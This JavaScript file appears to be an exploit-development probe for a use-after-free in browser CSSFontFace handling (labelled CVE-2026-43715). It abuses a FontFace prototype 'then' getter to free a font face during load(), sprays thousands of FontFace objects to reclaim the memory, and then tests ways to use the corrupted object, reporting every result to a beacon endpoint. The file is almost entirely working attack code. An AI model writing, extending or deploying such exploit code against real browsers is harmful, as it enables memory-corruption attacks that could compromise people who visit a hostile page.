// p459-fontface-uaf-ab.js — CVE-2026-43715 UAF: same-type groom exploitation
//
// PROVEN: p458 B-CHECK loadedIdx:[55] confirms UAF write (m_status=Success to freed CSSFontFace)
// BLOCKED: AB spray crashes at Timer::stop→RELEASE_ASSERT(m_thread==Thread::current())
// STRATEGY: Same-type (CSSFontFace) groom + exploit corrupted face's status mismatch
//
// Tests:
// A: Reproduce UAF + find corrupted face (reproducibility check)
// B: Use corrupted face in layout rendering (Canvas text + CSS font)
// C: Trigger load() on corrupted face → state machine confusion
// D: Multiple rounds for stability assessment
(function() {
    var RUN = 'p459-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // Helper: trigger UAF and return corrupted face index
    function triggerUAF(prefix, count) {
        var style = document.createElement('style');
        style.textContent = "@font-face { font-family: '" + prefix + "'; src: local('Arial'); }";
        document.head.appendChild(style);
        document.body.offsetHeight;

        var rule = style.sheet.cssRules[0];
        var face = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === prefix) { face = e.value; break; }
        }
        if (!face) return { err: 'NO-FACE' };

        var thenCount = 0;
        var sprayFaces = [];

        Object.defineProperty(FontFace.prototype, 'then', { get: function() {
            thenCount++;
            if (thenCount === 1) {
                rule.style.setProperty('font-weight', 'bold');
                document.body.offsetHeight;
                for (var i = 0; i < count; i++) {
                    var ff = new FontFace('s_' + prefix + '_' + i, "local('ZZZZZ_NoFont_" + prefix + '_' + i + "')");
                    document.fonts.add(ff);
                    sprayFaces.push(ff);
                }
            }
            return undefined;
        }, configurable: true });

        var promise = face.loaded;
        face.load();
        try { delete FontFace.prototype.then; } catch(e) {}

        var loaded = [];
        for (var i = 0; i < sprayFaces.length; i++) {
            if (sprayFaces[i].status === 'loaded') loaded.push(i);
        }

        return { thenCount: thenCount, sprayCount: count, loadedCount: loaded.length, loadedIdx: loaded.slice(0, 20), sprayFaces: sprayFaces };
    }

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Reproduce UAF + find corrupted face
    // ═══════════════════════════════════════════════════════════════
    var resultA = null;
    try {
        resultA = triggerUAF('p459a', 3000);
        B('A-RESULT', {
            thenCount: resultA.thenCount,
            loadedCount: resultA.loadedCount,
            loadedIdx: resultA.loadedIdx
        });
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Use corrupted face in Canvas text rendering
    // If CSSFontFace status=Success but no font data loaded,
    // Canvas.fillText may access null font or uninitialized data
    // ═══════════════════════════════════════════════════════════════
    try {
        if (resultA && resultA.loadedCount > 0 && resultA.sprayFaces) {
            var corruptedIdx = resultA.loadedIdx[0];
            var corruptedFace = resultA.sprayFaces[corruptedIdx];
            var familyName = corruptedFace.family;

            B('B-INFO', {
                idx: corruptedIdx,
                family: familyName,
                status: corruptedFace.status,
                loaded: 'checking'
            });

            // Method 1: Canvas with corrupted font
            var canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            var ctx = canvas.getContext('2d');

            try {
                ctx.font = "24px '" + familyName + "', serif";
                ctx.fillText('TEST', 10, 30);
                B('B-CANVAS', {
                    status: 'ok',
                    font: ctx.font
                });
            } catch(e) { B('B-CANVAS-ERR', e.message.slice(0,200)); }

            // Method 2: CSS element with corrupted font
            try {
                var el = document.createElement('div');
                el.style.fontFamily = "'" + familyName + "', serif";
                el.style.fontSize = '24px';
                el.textContent = 'CORRUPT_FONT_TEST';
                document.body.appendChild(el);
                document.body.offsetHeight; // force layout

                var computed = getComputedStyle(el);
                B('B-CSS', {
                    status: 'ok',
                    family: computed.fontFamily,
                    offsetWidth: el.offsetWidth,
                    offsetHeight: el.offsetHeight
                });
            } catch(e) { B('B-CSS-ERR', e.message.slice(0,200)); }

            // Method 3: Access .loaded promise on corrupted face
            try {
                var loadedPromise = corruptedFace.loaded;
                var promiseState = 'pending';
                loadedPromise.then(function() {
                    promiseState = 'resolved';
                }).catch(function(e) {
                    promiseState = 'rejected:' + e.message;
                });
                // Check synchronous state
                B('B-PROMISE', {
                    status: corruptedFace.status,
                    promiseState: promiseState
                });
            } catch(e) { B('B-PROMISE-ERR', e.message.slice(0,200)); }
        } else {
            B('B-SKIP', 'no corrupted face found');
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Call load() on corrupted face → state machine confusion
    // Status is Success but source is local('ZZZZZ') which can't resolve
    // pump() skips setStatus(Failure) because m_status is already Success
    // ═══════════════════════════════════════════════════════════════
    try {
        if (resultA && resultA.loadedCount > 0 && resultA.sprayFaces) {
            var cidx = resultA.loadedIdx[0];
            var cface = resultA.sprayFaces[cidx];
            var cLog = [];

            cLog.push('pre-status=' + cface.status);

            // Try loading the corrupted face
            try {
                cface.load();
                cLog.push('post-load-status=' + cface.status);
            } catch(e) { cLog.push('load-err=' + e.message.slice(0,100)); }

            // Check document.fonts status after corrupted face interaction
            cLog.push('fonts-status=' + document.fonts.status);
            cLog.push('fonts-size=' + document.fonts.size);

            // Try removing and re-adding
            try {
                document.fonts.delete(cface);
                cLog.push('deleted-ok');
                document.fonts.add(cface);
                cLog.push('readded-status=' + cface.status);
            } catch(e) { cLog.push('readd-err=' + e.message.slice(0,100)); }

            // Check if m_activeCount is corrupted by trying to load a new font
            try {
                var probeStyle = document.createElement('style');
                probeStyle.textContent = "@font-face { font-family: 'p459probe'; src: url('/nonexistent.woff2'); }";
                document.head.appendChild(probeStyle);
                document.body.offsetHeight;

                var probeIt = document.fonts.values();
                var probeEntry;
                var probeFace = null;
                while (!(probeEntry = probeIt.next()).done) {
                    if (probeEntry.value.family.replace(/['"]/g, '') === 'p459probe') {
                        probeFace = probeEntry.value;
                        break;
                    }
                }

                if (probeFace) {
                    probeFace.load();
                    cLog.push('probe-status=' + probeFace.status);
                    cLog.push('fonts-status-after-probe=' + document.fonts.status);
                    // If m_activeCount is UINT_MAX, fonts.status should still be "loaded"
                    // even though a font is loading
                    var mismatch = (probeFace.status === 'loading' && document.fonts.status !== 'loading');
                    cLog.push('activeCount-mismatch=' + mismatch);
                    probeFace.loaded.catch(function(){});
                }
            } catch(e) { cLog.push('probe-err=' + e.message.slice(0,100)); }

            B('C-RESULT', {log: cLog});
        } else {
            B('C-SKIP', 'no corrupted face');
        }
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: Multiple rounds for stability
    // ═══════════════════════════════════════════════════════════════
    try {
        var dResults = [];
        for (var round = 0; round < 5; round++) {
            try {
                var r = triggerUAF('p459d' + round, 2000);
                dResults.push({
                    round: round,
                    loaded: r.loadedCount,
                    idx: r.loadedIdx.slice(0, 5)
                });
            } catch(e) {
                dResults.push({round: round, err: e.message.slice(0, 100)});
            }
        }
        B('D-RESULT', dResults);
    } catch(e) { B('D-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST E: Verify m_activeCount wrap detection
    // After UAF, m_activeCount should be UINT_MAX (double decrement)
    // Load multiple fonts and check if fonts.status stays "loaded"
    // ═══════════════════════════════════════════════════════════════
    try {
        var eLog = [];
        eLog.push('pre-fonts-status=' + document.fonts.status);

        // Create 5 loading fonts via url()
        var loadingFaces = [];
        for (var i = 0; i < 5; i++) {
            var es = document.createElement('style');
            es.textContent = "@font-face { font-family: 'p459e" + i + "'; src: url('/nonexistent-" + i + ".woff2'); }";
            document.head.appendChild(es);
            document.body.offsetHeight;
        }

        // Find and load them
        var eit = document.fonts.values();
        var ee;
        while (!(ee = eit.next()).done) {
            var fam = ee.value.family.replace(/['"]/g, '');
            if (fam.indexOf('p459e') === 0) {
                loadingFaces.push(ee.value);
                ee.value.load();
                ee.value.loaded.catch(function(){});
            }
        }

        eLog.push('loading-count=' + loadingFaces.length);
        eLog.push('fonts-status-during-load=' + document.fonts.status);

        // If m_activeCount wrapped, fonts.status should be "loaded" even during active loading
        var anyLoading = false;
        for (var i = 0; i < loadingFaces.length; i++) {
            if (loadingFaces[i].status === 'loading') anyLoading = true;
        }
        eLog.push('any-actually-loading=' + anyLoading);
        eLog.push('fonts-says-loaded=' + (document.fonts.status === 'loaded'));
        var activeCountWrapped = anyLoading && document.fonts.status === 'loaded';
        eLog.push('ACTIVECOUNT-WRAP=' + activeCountWrapped);

        B('E-RESULT', {log: eLog});
    } catch(e) { B('E-ERR', e.message.slice(0,200)); }


    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
